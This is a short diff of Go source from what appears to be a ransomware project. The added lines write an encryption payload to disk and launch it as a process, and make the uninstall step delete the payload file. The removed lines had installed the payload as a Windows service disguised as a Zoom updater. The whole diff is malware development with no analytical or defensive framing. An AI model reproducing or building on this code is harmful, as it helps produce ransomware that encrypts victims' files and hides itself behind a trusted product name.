@@ -14,7 +14,6 @@ import (
     "bufio"
     "time"
 
-    "github.com/sug0/sr-ransomware/go/fs"
     "github.com/sug0/sr-ransomware/go/win"
     "github.com/sug0/sr-ransomware/go/exe"
     "github.com/sug0/sr-ransomware/go/errors"
@@ -23,23 +22,12 @@ import (
 )
 
 func InstallPayload(cryptoPayloadBytes []byte) error {
-    err := ioutil.WriteFile(cryptoZip, cryptoPayloadBytes, 0644)
+    err := ioutil.WriteFile(cryptoPayload, cryptoPayloadBytes, 0744)
     if err != nil {
         return errors.Wrap(pkg, "failed to write payload", err)
     }
-    err = fs.Unzip(cryptoDir, cryptoZip)
-    if err != nil {
-        return errors.Wrap(pkg, "failed to unzip payload", err)
-    }
-    err = os.Remove(cryptoZip)
-    if err != nil {
-        return errors.Wrap(pkg, "failed to remove zip payload", err)
-    }
-    err = win.InstallService("zoomupdater", "ZoomUpdater", cryptoPayload)
-    if err != nil {
-        return errors.Wrap(pkg, "failed to install payload service", err)
-    }
-    return errors.WrapIfNotNil(pkg, "failed to start payload service", win.StartService("zoomupdater"))
+    err = win.LaunchProcess(false, `"`+cryptoPayload+`"`)
+    return errors.WrapIfNotNil(pkg, "failed to launch payload", err)
 }
 
 // Register infection date.
@@ -80,11 +68,7 @@ func Infect() (bool, error) {
 }
 
 func Desinfect() error {
-    err := win.ShellExecute(
-        "runas", "cmd.exe",
-        `/c "sc.exe STOP zoomupdater && sc.exe DELETE zoomupdater"`,
-        win.SW_HIDE,
-    )
+    err := win.LaunchProcess(false, `cmd.exe /c "ping -n 5 & del "` + cryptoPayload + `""`)
     return errors.WrapIfNotNil(pkg, "failed to desinfect", err)
 }
 
